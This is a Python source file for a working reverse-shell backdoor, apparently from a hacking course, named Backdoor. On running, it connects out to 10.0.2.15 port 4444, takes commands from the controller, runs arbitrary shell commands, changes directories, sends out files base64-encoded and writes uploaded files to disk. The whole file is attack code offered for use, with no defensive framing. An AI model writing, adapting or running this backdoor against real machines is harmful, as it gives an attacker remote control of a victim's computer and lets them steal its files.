#!/usr/bin/env python

import socket
import subprocess, json, os, base64

class Backdoor:
    
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        
    
    def relaible_send(self, data):
        json_data = json.dumps(data)
        json_data = json_data.encode()
        self.connection.send(json_data)
        
    
    def relaible_receive(self):
        json_data = ""
        try:
            json_data = self.connection.recv(1024)
            return json.loads(json_data)
        except ValueError:
            while True:
                try:
                    json_data = json_data + self.connection.recv(1024)
                    return json.loads(json_data)
                except ValueError:
                    continue
        
    
    
    def change_working_directory_to(self, path):
        command_result = "[+] Changing working directory to "+ path
        os.chdir(path)
        return command_result
    

    def execute_system_commands(self, command):
        return subprocess.check_output(command, shell=True)
    
    
    def read(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
        
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"


    def run(self):
        while True:
            command = self.relaible_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read(command[1])
                    command_result = command_result.decode('utf-8')
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                    
                else:
                    command_result = self.execute_system_commands(command)
                    command_result = command_result.decode('utf-8')
            except Exception:
                command_result = "[-] Error during command execution"
                
            self.relaible_send(command_result)
            

my_backdoor = Backdoor("10.0.2.15", 4444)
my_backdoor.run()
